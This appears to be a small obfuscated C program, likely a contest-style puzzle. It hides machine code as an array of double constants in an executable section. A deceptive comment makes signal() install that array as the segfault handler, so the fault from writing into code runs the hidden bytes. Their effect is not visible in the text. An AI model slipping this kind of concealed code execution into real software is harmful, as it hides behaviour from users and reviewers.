#if !defined(__i386__) && !defined(__x86_64__)
#error not that handy
#endif

#include <signal.h>

const __attribute__((section(".text.")))

double handy[] = {
	5.633774969832335e+113,
	7.780341692776989e+179,
	1.671822431809381e+243,
	1.872967933034833e-253,
	2.5538029983933017e-18,
	4.461155904466174e-286,
	1.9689460668524135e+00
};

int main() {
	*(double volatile*)handy *= (long) //* distraction *//;
	signal(SIGSEGV, (void*)handy);
}
